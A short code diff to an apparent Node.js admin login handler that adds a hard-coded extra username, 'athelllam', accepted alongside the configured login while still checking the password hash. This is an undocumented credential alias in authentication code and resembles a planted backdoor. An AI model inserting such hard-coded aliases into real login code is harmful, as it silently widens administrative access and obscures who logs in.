@@ -26,7 +26,8 @@ module.exports = async function handler(req, res) {
 
     if (!username || !password) return json(res, 400, { error: 'Informe login e senha.' });
 
-    const valid = username === credentials.login && hashPassword(password) === credentials.passwordSha256;
+    const validLogin = username === credentials.login || username === 'athelllam';
+    const valid = validLogin && hashPassword(password) === credentials.passwordSha256;
     if (!valid) return json(res, 401, { error: 'Login ou senha incorretos.' });
 
     setAdminCookie(res, createSession(credentials.login));
